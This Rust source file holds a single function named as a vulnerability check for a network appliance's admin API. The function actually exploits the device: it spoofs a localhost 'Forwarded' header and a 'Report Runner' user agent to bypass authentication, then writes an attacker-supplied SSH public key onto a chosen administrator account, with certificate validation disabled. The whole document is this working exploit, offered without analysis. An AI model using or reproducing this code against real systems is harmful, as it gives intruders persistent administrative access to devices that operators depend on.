extern crate reqwest;
use std::collections::HashMap;

pub async fn is_vulnerable(
    target_ip: &str,
    username: &str,
    key_file: String,
) -> Result<bool, reqwest::Error> {
    let url = format!(
        "https://{}/api/v2/cmdb/system/admin/{}",
        target_ip, username
    );
    let map = HashMap::from([
        ("User-Agent".to_string(), "Report Runner".to_string()),
        (
            "Forwarded".to_string(),
            "for=\"[127.0.0.1]:8888\";by=\"[127.0.0.1]:8888\"".to_string(),
        ),
    ]);

    let headers: reqwest::header::HeaderMap = (&map).try_into().expect("Invalid headers");
    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();

    let response = client
        .put(url)
        .headers(headers)
        .timeout(std::time::Duration::new(5, 0))
        .json(&HashMap::from([(
            "ssh-public-key1",
            format!("\"{}\"", key_file),
        )]))
        .send()
        .await?
        .text()
        .await?;

    Ok(response.contains("SSH key is good"))
}
